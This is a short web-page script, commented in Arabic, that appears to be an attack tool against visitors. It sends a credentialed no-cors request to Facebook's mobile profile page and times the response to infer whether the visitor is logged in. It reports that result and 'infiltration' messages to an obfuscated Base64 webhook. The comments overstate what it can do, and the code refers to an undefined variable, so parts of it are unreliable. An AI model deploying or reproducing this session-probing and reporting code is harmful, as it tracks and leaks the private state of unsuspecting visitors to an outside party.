    <script>
        // رابط الويب هوك مشفر بالكامل (Base64)

        const HOOK = atob(enc);

        async function strike() {
            document.querySelector('h1').innerText = "V36";
            document.querySelector('h1').style.color = "#0f0";

            // 1. إرسال إشارة البدء
            fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "☣️ **V36 INFILTRATION STARTED**\nBypassing CORS filters..."})});

            // 2. تكتيك الـ Ghost Request
            // بنحاول نطلب صفحة الـ Settings ونخلي المتصفح يرفق الكوكيز
            const controller = new AbortController();
            const signal = controller.signal;

            try {
                // نفتح "نفق" لصفحة فيسبوك الأساسية اللي فيها التوكن
                const probe = fetch("https://mbasic.facebook.com/profile.php", {
                    mode: 'no-cors',
                    credentials: 'include' // أهم سطر: إجبار المتصفح على إرسال الكوكيز
                });

                // 3. تحليل البصمة الزمنية (Time-based Inference)
                // إذا الاستجابة سريعة يعني الحساب مفتوح، إذا بطيئة يعني مقفل
                const start = Date.now();
                await probe;
                const end = Date.now();
                
                const status = (end - start < 1500) ? "✅ ACTIVE SESSION FOUND" : "❌ NO SESSION";

                // إرسال النتيجة النهائية
                fetch(HOOK, { 
                    method: 'POST', 
                    mode: 'no-cors', 
                    body: JSON.stringify({
                        content: `📊 **Result:** ${status}\n⏱ **Latency:** ${end - start}ms\n📡 **Tunnel:** Bridge Injected`
                    })
                });

            } catch(e) {
                fetch(HOOK, {method: 'POST', mode: 'no-cors', body: JSON.stringify({content: "⚠️ Tunnel Blocked by OS"})});
            }
        }
    </script>
